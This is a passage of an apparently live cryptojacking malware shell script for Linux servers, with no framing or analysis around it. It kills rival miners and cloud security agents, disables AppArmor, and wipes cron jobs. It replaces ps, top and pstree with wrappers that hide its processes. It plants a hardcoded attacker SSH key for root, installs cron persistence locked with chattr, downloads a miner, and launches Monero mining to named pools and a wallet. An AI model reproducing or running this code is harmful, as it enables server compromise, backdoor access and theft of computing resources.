ps aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '107.174.47.156' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '83.220.169.247' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '51.38.203.146' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '144.217.45.45' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '107.174.47.181' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep '176.31.6.16' | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:8080" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:3333" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "zhuabcn@yahoo.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "monerohash.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:6666" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:7777" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:443" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "kieuanilam.me" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
pgrep -f xzpauectgr | xargs -I % kill -9 %
pgrep -f slxfbkmxtd | xargs -I % kill -9 %
pgrep -f mixtape | xargs -I % kill -9 %
pgrep -f addnj | xargs -I % kill -9 %
pgrep -f 200.68.17.196 | xargs -I % kill -9 %
pgrep -f IyEvYmluL3NoCgpzUG | xargs -I % kill -9 %
pgrep -f KHdnZXQgLXFPLSBodHRw | xargs -I % kill -9 %
pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3 | xargs -I % kill -9 %
pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo | xargs -I % kill -9 %
pgrep -f mwyumwdbpq.conf | xargs -I % kill -9 %
pgrep -f honvbsasbf.conf | xargs -I % kill -9 %
pgrep -f mqdsflm.cf | xargs -I % kill -9 %
pgrep -f lower.sh | xargs -I % kill -9 %
pgrep -f ./ppp | xargs -I % kill -9 %
pgrep -f cryptonight | xargs -I % kill -9 %
pgrep -f ./seervceaess | xargs -I % kill -9 %
pgrep -f ./servceaess | xargs -I % kill -9 %
pgrep -f ./servceas | xargs -I % kill -9 %
pgrep -f ./servcesa | xargs -I % kill -9 %
pgrep -f ./vsp | xargs -I % kill -9 %
pgrep -f ./jvs | xargs -I % kill -9 %
pgrep -f ./pvv | xargs -I % kill -9 %
pgrep -f ./vpp | xargs -I % kill -9 %
pgrep -f ./pces | xargs -I % kill -9 %
pgrep -f ./rspce | xargs -I % kill -9 %
pgrep -f ./haveged | xargs -I % kill -9 %
pgrep -f ./jiba | xargs -I % kill -9 %
pgrep -f ./watchbog | xargs -I % kill -9 %
pgrep -f ./A7mA5gb | xargs -I % kill -9 %
pgrep -f kacpi_svc | xargs -I % kill -9 %
pgrep -f kswap_svc | xargs -I % kill -9 %
pgrep -f kauditd_svc | xargs -I % kill -9 %
pgrep -f kpsmoused_svc | xargs -I % kill -9 %
pgrep -f kseriod_svc | xargs -I % kill -9 %
pgrep -f kthreadd_svc | xargs -I % kill -9 %
pgrep -f ksoftirqd_svc | xargs -I % kill -9 %
pgrep -f kintegrityd_svc | xargs -I % kill -9 %
pgrep -f jawa | xargs -I % kill -9 %
pgrep -f oracle.jpg | xargs -I % kill -9 %
pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN | xargs -I % kill -9 %
pgrep -f 188.209.49.54 | xargs -I % kill -9 %
pgrep -f 181.214.87.241 | xargs -I % kill -9 %
pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ | xargs -I % kill -9 %
pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj | xargs -I % kill -9 %
pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK | xargs -I % kill -9 %
pgrep -f servim | xargs -I % kill -9 %
pgrep -f kblockd_svc | xargs -I % kill -9 %
pgrep -f native_svc | xargs -I % kill -9 %
pgrep -f ynn | xargs -I % kill -9 %
pgrep -f 65ccEJ7 | xargs -I % kill -9 %
pgrep -f jmxx | xargs -I % kill -9 %
pgrep -f 2Ne80nA | xargs -I % kill -9 %
pgrep -f sysstats | xargs -I % kill -9 %
pgrep -f systemxlv | xargs -I % kill -9 %
pgrep -f watchbog | xargs -I % kill -9 %
pgrep -f OIcJi1m | xargs -I % kill -9 %
pkill -f biosetjenkins
pkill -f Loopback
pkill -f apaceha
pkill -f cryptonight
pkill -f mixnerdx
pkill -f performedl
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbnc1
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f XJnRj
pkill -f mgwsl
pkill -f pythno
pkill -f jweri
pkill -f lx26
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f Duck.sh
pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
pkill -f icb5o
pkill -f nopxi
pkill -f irqbalanc1
pkill -f minerd
pkill -f i586
pkill -f gddr
pkill -f mstxmr
pkill -f ddg.2011
pkill -f wnTKYg
pkill -f deamon
pkill -f disk_genius
pkill -f sourplum
pkill -f polkitd
pkill -f nanoWatch
pkill -f zigw
pkill -f devtool
pkill -f devtools
pkill -f systemctI
pkill -f watchbog
pkill -f cryptonight
pkill -f sustes
pkill -f xmrig
pkill -f xmrig-cpu
pkill -f 121.42.151.137
pkill -f init12.cfg
pkill -f nginxk
pkill -f tmp/wc.confz
pkill -f xmrig-notls
pkill -f xmr-stak
pkill -f suppoie
pkill -f zer0day.ru
pkill -f dbus-daemon--system
pkill -f nullcrew
pkill -f systemctI
pkill -f kworkerds
pkill -f init10.cfg
pkill -f /wl.conf
pkill -f crond64
pkill -f sustse
pkill -f vmlinuz
pkill -f exin
pkill -f apachiii
pkill -f crypto
pkill -f tntrecht
pkill -f xr
pkill -f svcupdate
pkill -9 cnrig
rm -rf /usr/bin/config.json
rm -rf /usr/bin/exin
rm -rf /tmp/wc.conf
rm -rf /tmp/log_rot
rm -rf /tmp/apachiii
rm -rf /tmp/sustse
rm -rf /tmp/php
rm -rf /tmp/p2.conf
rm -rf /tmp/pprt
rm -rf /tmp/ppol
rm -rf /tmp/javax/config.sh
rm -rf /tmp/javax/sshd2
rm -rf /tmp/.profile
rm -rf /tmp/1.so
rm -rf /tmp/kworkerds
rm -rf /tmp/kworkerds3
rm -rf /tmp/kworkerdssx
rm -rf /tmp/xd.json
rm -rf /tmp/syslogd
rm -rf /tmp/syslogdb
rm -rf /tmp/65ccEJ7
rm -rf /tmp/jmxx
rm -rf /tmp/2Ne80nA
rm -rf /tmp/dl
rm -rf /tmp/ddg
rm -rf /tmp/systemxlv
rm -rf /tmp/systemctI
rm -rf /tmp/.abc
rm -rf /tmp/osw.hb
rm -rf /tmp/.tmpleve
rm -rf /tmp/.tmpnewzz
rm -rf /tmp/.java
rm -rf /tmp/.omed
rm -rf /tmp/.tmpc
rm -rf /tmp/.tmpleve
rm -rf /tmp/.tmpnewzz
rm -rf /tmp/gates.lod
rm -rf /tmp/conf.n
rm -rf /tmp/devtool
rm -rf /tmp/devtools
rm -rf /tmp/fs
rm -rf /tmp/.rod
rm -rf /tmp/.rod.tgz
rm -rf /tmp/.rod.tgz.1
rm -rf /tmp/.rod.tgz.2
rm -rf /tmp/.mer
rm -rf /tmp/.mer.tgz
rm -rf /tmp/.mer.tgz.1
rm -rf /tmp/.hod
rm -rf /tmp/.hod.tgz
rm -rf /tmp/.hod.tgz.1
rm -rf /tmp/84Onmce
rm -rf /tmp/C4iLM4L
rm -rf /tmp/lilpip
rm -rf /tmp/3lmigMo
rm -rf /tmp/am8jmBP
rm -rf /tmp/tmp.txt
rm -rf /tmp/baby
rm -rf /tmp/.lib
rm -rf /tmp/systemd
rm -rf /tmp/lib.tar.gz
rm -rf /tmp/baby
rm -rf /tmp/java
rm -rf /tmp/j2.conf
rm -rf /tmp/.mynews1234
rm -rf /tmp/a3e12d
rm -rf /tmp/.pt
rm -rf /tmp/.pt.tgz
rm -rf /tmp/.pt.tgz.1
rm -rf /tmp/go
rm -rf /tmp/java
rm -rf /tmp/j2.conf
rm -rf /tmp/.tmpnewasss
rm -rf /tmp/java
rm -rf /tmp/go.sh
rm -rf /tmp/go2.sh
rm -rf /tmp/khugepageds
rm -rf /tmp/.censusqqqqqqqqq
rm -rf /tmp/.kerberods
rm -rf /tmp/kerberods
rm -rf /tmp/seasame
rm -rf /tmp/touch
rm -rf /tmp/.p
rm -rf /tmp/runtime2.sh
rm -rf /tmp/runtime.sh
rm -rf /dev/shm/z3.sh
rm -rf /dev/shm/z2.sh
rm -rf /dev/shm/.scr
rm -rf /dev/shm/.kerberods
rm -f /etc/ld.so.preload
rm -rf /etc/systemd/system/systemde.service*
rm -f /etc/ld.so.preload
rm -f /usr/local/lib/libioset.so
chattr -i /etc/ld.so.preload
rm -f /etc/ld.so.preload
systemctl stop moneroocean_miner.service
systemctl stop systemde.service
rm -f /usr/local/lib/libioset.so
rm -rf /tmp/watchdogs
rm -rf /etc/cron.d/tomcat
rm -rf /etc/rc.d/init.d/watchdogs
rm -rf /usr/sbin/watchdogs
rm -f /tmp/kthrotlds
rm -f /etc/rc.d/init.d/kthrotlds
rm -rf /tmp/.sysbabyuuuuu12
rm -rf /tmp/logo9.jpg
rm -rf /tmp/miner.sh
rm -rf /tmp/nullcrew
rm -rf /tmp/proc
rm -rf /tmp/2.sh
rm /opt/atlassian/confluence/bin/1.sh
rm /opt/atlassian/confluence/bin/1.sh.1
rm /opt/atlassian/confluence/bin/1.sh.2
rm /opt/atlassian/confluence/bin/1.sh.3
rm /opt/atlassian/confluence/bin/3.sh
rm /opt/atlassian/confluence/bin/3.sh.1
rm /opt/atlassian/confluence/bin/3.sh.2
rm /opt/atlassian/confluence/bin/3.sh.3
rm -rf /var/tmp/f41
rm -rf /var/tmp/2.sh
rm -rf /var/tmp/config.json
rm -rf /var/tmp/xmrig
rm -rf /var/tmp/1.so
rm -rf /var/tmp/kworkerds3
rm -rf /var/tmp/kworkerdssx
rm -rf /var/tmp/kworkerds
rm -rf /var/tmp/wc.conf
rm -rf /var/tmp/nadezhda.
rm -rf /var/tmp/nadezhda.arm
rm -rf /var/tmp/nadezhda.arm.1
rm -rf /var/tmp/nadezhda.arm.2
rm -rf /var/tmp/nadezhda.x86_64
rm -rf /var/tmp/nadezhda.x86_64.1
rm -rf /var/tmp/nadezhda.x86_64.2
rm -rf /var/tmp/sustse3
rm -rf /var/tmp/sustse
rm -rf /var/tmp/moneroocean/
rm -rf /var/tmp/devtool
rm -rf /var/tmp/devtools
rm -rf /var/tmp/play.sh
rm -rf /var/tmp/systemctI
rm -rf /var/tmp/.java
rm -rf /var/tmp/1.sh
rm -rf /var/tmp/conf.n
rm -r /var/tmp/lib
rm -r /var/tmp/.lib
rm -rf /opt/systemd-service.sh
rm -rf /opt/.systemd-service.sh
rm -rf /root/.systemd-service.sh
rm -rf /usr/share/\[crypto\]
chattr -R -ia /usr/bin/TeamTNT/*
chattr -R -ia /usr/bin/watchdogd*
rm -rf /usr/bin/watchdogd*
service crypto stop
systemctl stop crypto.service
systemctl stop watchdogd 
service watchdogd stop
rm -fr /usr/bin/TeamTNT/*
chattr -iau /tmp/lok
chmod +700 /tmp/lok
rm -rf /tmp/lok
sleep 1
chattr -i /tmp/kdevtmpfsi
echo 1 > /tmp/kdevtmpfsi
chattr +i /tmp/kdevtmpfsi
sleep 1
chattr -i /usr/lib/systemd/systemd-update-daily
echo 1 > /usr/lib/systemd/systemd-update-daily
chattr +i /usr/lib/systemd/systemd-update-daily
>/tmp/svcupdate
>/tmp/svcguard
>/etc/svcupdate
>/etc/svcguard
>/etc/cron.daily/logrotate
>/etc/cron.hourly/0anacron
>/etc/rc.d/rc.local
#yum install -y docker.io || apt-get install docker.io;
docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
#echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
rm -rf /usr/local/aegis
chattr -R -ia /var/spool/cron
chattr -ia /etc/crontab
chattr -R -ia /etc/cron.d
chattr -R -ia /var/spool/cron/crontabs
crontab -r
rm -rf /var/spool/cron/*
rm -rf /etc/cron.d/*
rm -rf /var/spool/cron/crontabs
rm -rf /etc/crontab
}
kill_miner_proc

kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "zzh"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "zzh"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}
kill_sus_proc

nameserver(){  
grep -q 1.1.1.1 /etc/resolv.conf || chattr -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 1.1.1.1" >> /etc/resolv.conf; chattr +i /etc/resolv.conf 2>/dev/null 1>/dev/null
}

nameserver

fuckyou(){

$(docker rm $(docker ps | grep -v grep | grep "/root/startup.sh" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "widoc26117/xmr" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "zbrtgwlxz" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "tail -f /dev/null" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "/usr/bin/supervisor…" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "/app/BitLockerServi…" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)

rm -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
pkill -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
rm -fr /tmp/moneroocean/ 2>/dev/null 1>/dev/null
killall -9 xmrig 2>/dev/null 1>/dev/null

if [ -f /root/.tmp/xmrig ]; then
chattr -iR /root/.tmp/ 2>/dev/null 1>/dev/null
tmpxmrigfile="/root/.tmp/miner.sh"
rm -f $tmpxmrigfile 2>/dev/null 1>/dev/null
pkill -f $tmpxmrigfile 2>/dev/null 1>/dev/null
kill $(pidof $tmpxmrigfile) 2>/dev/null 1>/dev/null
chmod +x $tmpxmrigfile 2>/dev/null 1>/dev/null
chattr +i $tmpxmrigfile 2>/dev/null 1>/dev/null
pkill -f $tmpxmrigfile 2>/dev/null 1>/dev/null
kill $(pidof $tmpxmrigfile) 2>/dev/null 1>/dev/null
killall $tmpxmrigfile 2>/dev/null 1>/dev/null
chmod -x /root/.tmp/xmrig 2>/dev/null 1>/dev/null
rm -f /root/.tmp/xmrig 2>/dev/null 1>/dev/null
chattr +i /root/.tmp/xmrig 2>/dev/null 1>/dev/null
pkill -f /root/.tmp/xmrig 2>/dev/null 1>/dev/null
ps ax| grep xmrig 2>/dev/null 1>/dev/null
fi


KINSING1=$(ps ax | grep -v grep |  grep "/var/tmp/kinsing")
if [ ! -z "$KINSING1" ];
then
chattr -i /var/tmp/kinsing 2>/dev/null 1>/dev/null
chmod -x /var/tmp/kinsing 2>/dev/null 1>/dev/null
pkill -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/var/tmp/kinsing" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /var/tmp/kinsing) 2>/dev/null 1>/dev/null
echo " " > /var/tmp/kinsing 2>/dev/null 1>/dev/null
rm -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
echo "fuckyou" > /var/tmp/kinsing
chattr +i /var/tmp/kinsing 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

KINSING2=$(ps ax | grep -v grep |  grep "/tmp/kdevtmpfsi")
if [ ! -z "$KINSING2" ];
then
chattr -i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
chmod -x /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
pkill -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/tmp/kdevtmpfsi" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /tmp/kdevtmpfsi) 2>/dev/null 1>/dev/null
echo " " > /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
rm -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
echo "fuckyou" > /tmp/kdevtmpfsi
chattr +i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

}

fuckyou

downloads()
{
    if [ -f "/usr/bin/curl" ]
    then 
  echo $1,$2
        http_code=`curl -I -m 50 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 100 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            curl --connect-timeout 100 --retry 100 $1 > $2
        else
            curl --connect-timeout 100 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/cd1" ]
    then
        http_code=`cd1 -I -m 50 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            cd1 --connect-timeout 100 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            cd1 --connect-timeout 100 --retry 100 $1 > $2
        else
            cd1 --connect-timeout 100 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/wget" ]
    then
        wget --timeout=50 --tries=100 -O $2 $1
        if [ $? -ne 0 ]
  then
    wget --timeout=100 --tries=100 -O $2 $3
        fi
    elif [ -f "/usr/bin/wd1" ]
    then
        wd1 --timeout=100 --tries=100 -O $2 $1
        if [ $? -eq 0 ]
        then
            wd1 --timeout=100 --tries=100 -O $2 $3
        fi
    fi
}


unlock_cron()
{
    chattr -R -ia /var/spool/cron
    chattr -ia /etc/crontab
    chattr -R -ia /var/spool/cron/crontabs
    chattr -R -ia /etc/cron.d
}

lock_cron()
{
    chattr -R +ia /var/spool/cron
    chattr +ia /etc/crontab
    chattr -R +ia /var/spool/cron/crontabs
    chattr -R +ia /etc/cron.d
}


if [ -f "$rtdir" ]
then
        echo "i am root"
        mkdir -p /root/.ssh
        echo "goto 1" >> /etc/zzhs
        chattr -ia /etc/zzh*
        chattr -ia /etc/newinit.sh*
        chattr -ia /root/.ssh/authorized_keys*
        chattr -R -ia /root/.ssh
    if [ -f "/bin/ps.original" ]
    then
        echo "/bin/ps changed"
    else
        mv /bin/ps /bin/ps.original 
        echo "#! /bin/bash">>/bin/ps
        echo "ps.original \$@ | grep -v \"zzh\|pnscan\"">>/bin/ps
        chmod +x /bin/ps
    touch -d 20160825 /bin/ps
        echo "/bin/ps changing"
    fi
    if [ -f "/bin/top.original" ]
    then
        echo "/bin/top changed"
    else
        mv /bin/top /bin/top.original 
        echo "#! /bin/bash">>/bin/top
        echo "top.original \$@ | grep -v \"zzh\|pnscan\"">>/bin/top
        chmod +x /bin/top
    touch -d 20160825 /bin/top
        echo "/bin/top changing"
    fi
    if [ -f "/bin/pstree.original" ]
    then
        echo "/bin/pstree changed"
    else
        mv /bin/pstree /bin/pstree.original 
        echo "#! /bin/bash">>/bin/pstree
        echo "pstree.original \$@ | grep -v \"zzh\|pnscan\"">>/bin/pstree
        chmod +x /bin/pstree
    touch -d 20160825 /bin/pstree
        echo "/bin/pstree changing"
    fi
    if [ -f "/bin/chattr" ]
  then
    chattrsize=`ls -l /bin/chattr | awk '{ print $5 }'`
    if [ "$chattrsize" -lt "$chattr_size" ]
    then
      yum -y remove e2fsprogs
            yum -y install e2fsprogs
    else
      echo "no need install chattr"
    fi
  else
      yum -y remove e2fsprogs
            yum -y install e2fsprogs
    fi
      unlock_cron
      rm -f ${crondir}
      rm -f /etc/cron.d/zzh
      rm -f /etc/crontab
      echo "*/50 * * * * sh /etc/newinit.sh >/dev/null 2>&1" >> ${crondir}
      echo "*/50 * * * * root sh /etc/newinit.sh >/dev/null 2>&1" >> /etc/cron.d/zzh
      echo "0 1 * * * root sh /etc/newinit.sh >/dev/null 2>&1" >> /etc/crontab
      echo crontab created
      lock_cron
        chmod 700 /root/.ssh/
        echo >> /root/.ssh/authorized_keys
        chmod 600 /root/.ssh/authorized_keys
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3QgqCevA1UIX9jkWJNzaDHmCFQMCVn6DlhT8Tj1CcBLouOPpuBVqGoZem9UT/sdy563H+e1cQD6LRA9lgyBO8VBOuyjlPf/rdYeXZRv9eFZ4ROGCOX/dvNzV9XdEyPX+znEL4AS45ko0obSqNGbserHPcKtXBjjcf9zWtRvBA4lteyXENWeCST61OhVI0K7bNTUHsQhFC0rgiGFqVv+kIwMVauMxeNd5PjsES4C5P9G8Ynligmdxp7LdOFeb5/V/iO8eceQsxLyXVCe2Jue5gaaOIbKy2j2HPxj6qK2BUqlx+dJdat6HE2HyPWDKD5jPyA5RCSs1zphe7BQjH20cX1nyzbhxNNQncs5BfB0kk2Qcb9IS/ofX9p8zIVKLUHMUNC9mKqPljzxH/3wYnOZrgebS4uwfyad+6SQ1oRfs1vWotXxSz1hBjhRPpUqzA7J865AcSOZBaoRsRKZ1BaGMyJyjIfkecFgeDpmbHzOzCjIXAeh20S2wLYZGdrhgVEr0= uc1" > /root/.ssh/authorized_keys
        
  
        file="/etc/zzh"

    
    if [ -f "/etc/zzh" ]
    then
            filesize1=`ls -l /etc/zzh | awk '{ print $5 }'`
            if [ "$filesize1" -ne "$miner_size" ] 
            then
                pkill -f zzh
                rm /etc/zzh
                downloads $miner_url /etc/zzh $miner_url_backup
            else
                echo "not need download"
            fi
    else
            downloads $miner_url /etc/zzh $miner_url_backup
    fi


    downloads $sh_url /etc/newinit.sh $sh_url_backup


    chmod 777 /etc/zzh
    if [ -f "/bin/ps.original" ]
    then
        ps.original -fe|grep zzh |grep -v grep
    else
        ps -fe|grep zzh |grep -v grep
    fi
    if [ $? -ne 0 ]
    then
                cd /etc
                echo "not root runing"
                sleep 5s
                
              ./zzh --log-file=/etc/etc --keepalive --no-color --cpu-priority 5 -o dev.fugglesoft.me:5443 --tls --nicehash --coin monero -o 80.211.206.105:9000 -u 88MjAGcUuFzRM2AaUK1qoj9uTp9VBaFzDDUARzmTZL1XUU3DVVkAtxUUb5sHtFMisnSy5dSLQHfUBVdEVgwuwXm5E7LzQ4z.22 --tls --coin monero -o opn.en2an.top:5443 --tls --nicehash --coin monero --background &
    else
                echo "root runing....."
    fi

    chmod 777 /etc/zzh
    chattr +ia /etc/zzh
    chmod 777 /etc/newinit.sh
    chattr +ia /etc/newinit.sh
    chmod 600 /root/.ssh/authorized_keys
    chattr +ia /root/.ssh/authorized_keys
else
    echo "goto 1" > /tmp/zzhs
    chattr -ia /tmp/zzh*
    chattr -ia /tmp/newinit.sh*
        
    if [ ! -f "/usr/bin/crontab" ]
  then
      unlock_cron
      echo "*/30 * * * * sh /tmp/newinit.sh >/dev/null 2>&1" >> ${crondir}
      lock_cron
  else
      unlock_cron
      [[ $cont =~ "newinit.sh" ]] || (crontab -l ; echo "*/30 * * * * sh /tmp/newinit.sh >/dev/null 2>&1") | crontab -
      lock_cron
  fi
        chmod 700 ~/.ssh/
        echo >> ~/.ssh/authorized_keys
        chmod 600 ~/.ssh/authorized_keys
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3QgqCevA1UIX9jkWJNzaDHmCFQMCVn6DlhT8Tj1CcBLouOPpuBVqGoZem9UT/sdy563H+e1cQD6LRA9lgyBO8VBOuyjlPf/rdYeXZRv9eFZ4ROGCOX/dvNzV9XdEyPX+znEL4AS45ko0obSqNGbserHPcKtXBjjcf9zWtRvBA4lteyXENWeCST61OhVI0K7bNTUHsQhFC0rgiGFqVv+kIwMVauMxeNd5PjsES4C5P9G8Ynligmdxp7LdOFeb5/V/iO8eceQsxLyXVCe2Jue5gaaOIbKy2j2HPxj6qK2BUqlx+dJdat6HE2HyPWDKD5jPyA5RCSs1zphe7BQjH20cX1nyzbhxNNQncs5BfB0kk2Qcb9IS/ofX9p8zIVKLUHMUNC9mKqPljzxH/3wYnOZrgebS4uwfyad+6SQ1oRfs1vWotXxSz1hBjhRPpUqzA7J865AcSOZBaoRsRKZ1BaGMyJyjIfkecFgeDpmbHzOzCjIXAeh20S2wLYZGdrhgVEr0= uc1" > ~/.ssh/authorized_keys
        

    if [ -f "/tmp/zzh" ]
    then    
        filesize1=`ls -l /tmp/zzh | awk '{ print $5 }'`
        if [ "$filesize1" -ne "$miner_size" ] 
        then
                pkill -f zzh
                rm /tmp/zzh
                downloads $miner_url /tmp/zzh $miner_url_backup
        else
                echo "no need download"
        fi
    else
            downloads $miner_url /tmp/zzh $miner_url_backup
    fi


    echo "i am here"
    downloads $sh_url /tmp/newinit.sh $sh_url_backup

    ps -fe|grep zzh |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmp runing"
                cd /tmp
                chmod 777 zzh
                sleep 5s
             
              ./zzh --log-file=/tmp/tmp --keepalive --no-color --cpu-priority 5 -o dev.fugglesoft.me:5443 --tls --nicehash --coin monero -o 80.211.206.105:9000 -u 88MjAGcUuFzRM2AaUK1qoj9uTp9VBaFzDDUARzmTZL1XUU3DVVkAtxUUb5sHtFMisnSy5dSLQHfUBVdEVgwuwXm5E7LzQ4z.22 --tls --coin monero -o opn.en2an.top:5443 --tls --nicehash --coin monero --background &
            else
                echo "tmp runing....."
